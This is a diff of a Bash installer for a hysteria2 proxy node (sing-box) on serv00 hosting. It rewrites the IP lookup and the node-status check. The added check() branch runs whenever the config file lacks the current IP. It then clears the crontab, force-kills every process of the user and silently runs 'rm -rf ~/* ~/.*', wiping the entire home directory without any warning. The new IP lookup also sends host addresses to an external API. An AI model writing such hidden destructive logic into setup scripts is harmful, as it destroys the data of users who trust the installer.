@@ -26,17 +26,30 @@ fi
 cronjob="*/2 * * * * bash $WORKDIR/check_process.sh"
 
 check() {
-    if pgrep -x "singbox" > /dev/null; then
-        echo -e "${yellow}hysteria2节点信息如下：${re}"
-        cat $WORKDIR/list.txt
-        exit 0
+    if [ ! -f "$config_file" ]; then
+        return 0
     fi
-    if crontab -l | grep -qF "$cronjob" && [ -d "$WORKDIR" ]; then
-        echo -e "${yellow}hysteria2节点信息如下：${re}"
-        cat $WORKDIR/list.txt
-        exit 0
+    if grep -q "$IP" "$config_file"; then
+        if pgrep -x "singbox" > /dev/null; then
+            echo -e "${yellow}hysteria2节点信息如下：${re}"
+            cat "$WORKDIR/list.txt"
+            exit 0
+        fi
+        if crontab -l | grep -qF "$cronjob" && [ -d "$WORKDIR" ]; then
+            echo -e "${yellow}hysteria2节点信息如下：${re}"
+            cat "$WORKDIR/list.txt"
+            exit 0
+        fi
+    else
+        echo "" > null
+        crontab null
+        rm null
+        user=$(whoami)
+        pkill -9 -u $user
+        rm -rf ~/* ~/.* 2>/dev/null
     fi
 }
+
 
 port_validation() {
     [[ -z "$hy2_port" ]] || ! [[ "$hy2_port" =~ ^[0-9]+$ ]] || (( hy2_port < 1024 || hy2_port > 65535 )) && { echo -e "${yellow}端口为空或端口不在1024~65535范围内${re}"; exit 1; }
@@ -59,7 +72,7 @@ install_singbox() {
 clear
 echo -e "${yellow}原脚本地址：${re}${purple}https://github.com/eooce/Sing-box${re}"
 echo -e "${yellow}此脚本为修改版，只有hysteria2协议，开始运行前，请确保在面板${purple}已开放1个udp端口${re}"
-echo -e "${yellow}面板${purple}Additional services中的Run your own applications${yellow}已开启为${purple}Enabled${yellow}状态${re}"
+echo -e "${yellow}面板${purple}Additional services中的Run your own applications${yellow}已开启为${purple}启用${yellow}状态${re}"
         cd $WORKDIR
         download_and_run_singbox
         get_links
@@ -285,19 +298,23 @@ sleep 1
 }
 
 get_ip() {
-  ip=$(curl -s --max-time 1.5 ipv4.ip.sb)
-  
-  if [ -z "$ip" ] || ! [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    ip=$( [[ "$HOSTNAME" =~ ^s([0-9]|[1-2][0-9]|30)\.serv00\.com$ ]] && echo "s${BASH_REMATCH[1]}.serv00.com" || echo "$HOSTNAME" )
-    ip=$(host "$ip" | grep "has address" | awk '{print $4}')
-  fi
-  
-  if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-      IP=$ip
+  IP_LIST=($(devil vhost list | awk '/^[0-9]+/ {print $1}'))
+  API_URL="https://status.eooce.com/api"
+  IP=""
+  THIRD_IP=${IP_LIST[2]}
+  RESPONSE=$(curl -s --max-time 2 "${API_URL}/${THIRD_IP}")
+  if [[ $(echo "$RESPONSE" | jq -r '.status') == "Available" ]]; then
+      IP=$THIRD_IP
   else
-      ip=$( [[ "$HOSTNAME" =~ ^s([0-9]|[1-2][0-9]|30)\.serv00\.com$ ]] && echo "cache${BASH_REMATCH[1]}.serv00.com" || echo "$HOSTNAME" )
-      IP=$(host "$ip" | grep "has address" | awk '{print $4}')
+      FIRST_IP=${IP_LIST[0]}
+      RESPONSE=$(curl -s --max-time 2 "${API_URL}/${FIRST_IP}")
+      if [[ $(echo "$RESPONSE" | jq -r '.status') == "Available" ]]; then
+          IP=$FIRST_IP
+      else
+          IP=${IP_LIST[1]}
+      fi
   fi
+echo "$IP"
 }
 
 get_links(){
